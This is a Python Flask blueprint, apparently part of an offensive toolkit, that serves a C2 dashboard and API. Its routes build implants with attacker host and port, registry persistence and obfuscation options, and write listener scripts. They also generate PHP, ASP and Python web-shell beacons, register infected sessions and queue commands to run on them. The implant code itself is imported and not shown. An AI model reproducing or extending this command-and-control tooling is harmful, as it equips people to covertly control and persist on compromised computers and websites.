from flask import Blueprint, render_template, request, jsonify, redirect, session
import logging

from cybermodules.c2_implant import C2ImplantGenerator, ImplantConfig, generate_c2_from_session

logger = logging.getLogger("c2_routes")

c2_bp = Blueprint("c2_implant", __name__)


# ============================================================
# WEB C2 LISTENER
# ============================================================

_web_c2_listener = None

def _get_web_c2_listener():
    """Get or create web C2 listener instance"""
    global _web_c2_listener
    if _web_c2_listener is None:
        try:
            from c2.web_c2_listener import get_web_c2_listener
            _web_c2_listener = get_web_c2_listener()
        except Exception as e:
            logger.warning(f"Web C2 listener import failed: {e}")
            return None
    return _web_c2_listener


@c2_bp.route("/c2")
def c2_dashboard():
    """C2 Implant Generator ana sayfası"""
    if not session.get("logged_in"):
        return redirect("/login")
    return render_template("c2_implant.html")


@c2_bp.route("/c2/generate", methods=["POST"])
def generate_implant():
    """C2 implant üret"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        config = ImplantConfig(
            implant_name=data.get("name", "implant"),
            lhost=data.get("lhost", "192.168.1.100"),
            lport=int(data.get("lport", 4444)),
            interval=int(data.get("interval", 30)),
            jitter=int(data.get("jitter", 5)),
            encryption=data.get("encryption", "aes256"),
            persistence=data.get("persistence", "registry"),
            obfuscate=data.get("obfuscate", False),
            output_path=data.get("output_path", "/tmp")
        )
        
        generator = C2ImplantGenerator()
        result = generator.create_full_implant(config)
        
        return jsonify({
            "success": result.success,
            "source_file": result.source_file,
            "binary_file": result.binary_file,
            "command": result.command,
            "error": result.error
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


@c2_bp.route("/c2/generate-full", methods=["POST"])
def generate_full_implant():
    """Session'dan tam implant üret"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        session_data = {
            "name": data.get("name", "implant"),
            "lhost": data.get("lhost", "192.168.1.100"),
            "lport": int(data.get("lport", 4444)),
            "interval": int(data.get("interval", 30)),
            "jitter": int(data.get("jitter", 5)),
            "encryption": data.get("encryption", "aes256"),
            "persistence": data.get("persistence", "registry"),
            "obfuscate": data.get("obfuscate", False)
        }
        
        result = generate_c2_from_session(session_data, "/tmp")
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


@c2_bp.route("/c2/listener", methods=["POST"])
def create_listener():
    """C2 listener scripti oluştur"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    data = request.get_json()
    
    try:
        lhost = data.get("lhost", "0.0.0.0")
        lport = int(data.get("lport", 4444))
        
        generator = C2ImplantGenerator()
        listener_path = generator.save_listener(lhost, lport, "/tmp")
        
        return jsonify({
            "success": True,
            "listener_file": listener_path,
            "command": f"python3 {listener_path}",
            "message": "Listener scripti oluşturuldu"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


@c2_bp.route("/c2/templates")
def get_templates():
    """Mevcut template'leri listele"""
    if not session.get("logged_in"):
        return jsonify({"error": "login_required"}), 401
    
    try:
        import os
        templates = []
        
        for f in os.listdir("/tmp"):
            if f.endswith(".go") or f.endswith(".exe") or f.startswith("c2_listener"):
                templates.append({
                    "name": f,
                    "path": f"/tmp/{f}",
                    "size": os.path.getsize(f"/tmp/{f}")
                })
        
        return jsonify({
            "success": True,
            "templates": templates
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        })


# ============================================================
# WEB C2 LISTENER ROUTES
# ============================================================

@c2_bp.route("/web-c2")
def web_c2_page():
    """Web C2 Listener page"""
    return render_template("web_c2_listener.html")


@c2_bp.route("/api/web-c2/stats")
def web_c2_stats():
    """Get C2 statistics"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({
            'total_sessions': 0,
            'active_sessions': 0,
            'total_commands': 0,
            'total_beacons': 0,
            'uptime': 0
        })
    return jsonify(c2.get_stats())


@c2_bp.route("/api/web-c2/sessions")
def web_c2_sessions():
    """List C2 sessions"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify([])
    return jsonify(c2.list_sessions())


@c2_bp.route("/api/web-c2/session/<session_id>")
def web_c2_session(session_id):
    """Get session details"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({'error': 'Module not available'}), 503
    
    sess = c2.get_session(session_id)
    if not sess:
        return jsonify({'error': 'Session not found'}), 404
    
    return jsonify(sess)


@c2_bp.route("/api/web-c2/session/<session_id>/commands")
def web_c2_session_commands(session_id):
    """Get command history for session"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify([])
    return jsonify(c2.get_command_history(session_id))


@c2_bp.route("/api/web-c2/command", methods=["POST"])
def web_c2_command():
    """Queue command for session"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({'error': 'Module not available'}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id')
    command = data.get('command')
    
    if not session_id or not command:
        return jsonify({'error': 'Session ID and command required'}), 400
    
    try:
        result = c2.queue_command(session_id, command)
        return jsonify({
            'success': True,
            'command_id': result.get('command_id'),
            'queued': True
        })
    except Exception as e:
        logger.exception("Command queue error")
        return jsonify({'error': str(e)}), 500


@c2_bp.route("/api/web-c2/register", methods=["POST"])
def web_c2_register():
    """Register new beacon (from web shell)"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({'error': 'Module not available'}), 503
    
    data = request.get_json() or {}
    
    try:
        sess = c2.register_beacon(data)
        return jsonify({
            'success': True,
            'session_id': sess.session_id,
            'key': sess.encryption_key
        })
    except Exception as e:
        logger.exception("Beacon registration error")
        return jsonify({'error': str(e)}), 500


@c2_bp.route("/api/web-c2/beacon", methods=["POST"])
def web_c2_beacon():
    """Handle beacon check-in"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({'error': 'Module not available'}), 503
    
    data = request.get_json() or {}
    session_id = data.get('session_id')
    
    if not session_id:
        return jsonify({'error': 'Session ID required'}), 400
    
    try:
        result = c2.process_beacon(session_id, data)
        return jsonify(result)
    except Exception as e:
        logger.exception("Beacon processing error")
        return jsonify({'error': str(e)}), 500


@c2_bp.route("/api/web-c2/session/<session_id>/terminate", methods=["POST"])
def web_c2_terminate(session_id):
    """Terminate session"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({'error': 'Module not available'}), 503
    
    try:
        c2.terminate_session(session_id)
        return jsonify({'success': True, 'message': 'Session terminated'})
    except Exception as e:
        logger.exception("Session termination error")
        return jsonify({'error': str(e)}), 500


@c2_bp.route("/api/web-c2/beacons")
def web_c2_beacon_templates():
    """Get available beacon templates"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({
            'php': {'name': 'PHP Beacon', 'available': True},
            'asp': {'name': 'ASP/ASPX Beacon', 'available': True},
            'python': {'name': 'Python Beacon', 'available': True}
        })
    return jsonify(c2.get_beacon_templates())


@c2_bp.route("/api/web-c2/generate-beacon", methods=["POST"])
def web_c2_generate_beacon():
    """Generate beacon code"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({'error': 'Module not available'}), 503
    
    data = request.get_json() or {}
    beacon_type = data.get('type', 'php')
    c2_url = data.get('c2_url', '')
    interval = data.get('interval', 30)
    jitter = data.get('jitter', 20)
    
    if not c2_url:
        return jsonify({'error': 'C2 URL required'}), 400
    
    try:
        config = {
            'c2_url': c2_url,
            'beacon_interval': interval,
            'jitter_percent': jitter,
            'encryption_key': data.get('key', '')
        }
        
        beacon_code = c2.generate_beacon(beacon_type, config)
        
        return jsonify({
            'success': True,
            'type': beacon_type,
            'code': beacon_code,
            'filename': f'beacon.{beacon_type}'
        })
    except Exception as e:
        logger.exception("Beacon generation error")
        return jsonify({'error': str(e)}), 500


@c2_bp.route("/api/web-c2/config")
def web_c2_config():
    """Get C2 configuration"""
    c2 = _get_web_c2_listener()
    if not c2:
        return jsonify({
            'max_sessions': 100,
            'session_timeout': 3600,
            'default_interval': 30,
            'default_jitter': 20
        })
    return jsonify(c2.get_config())
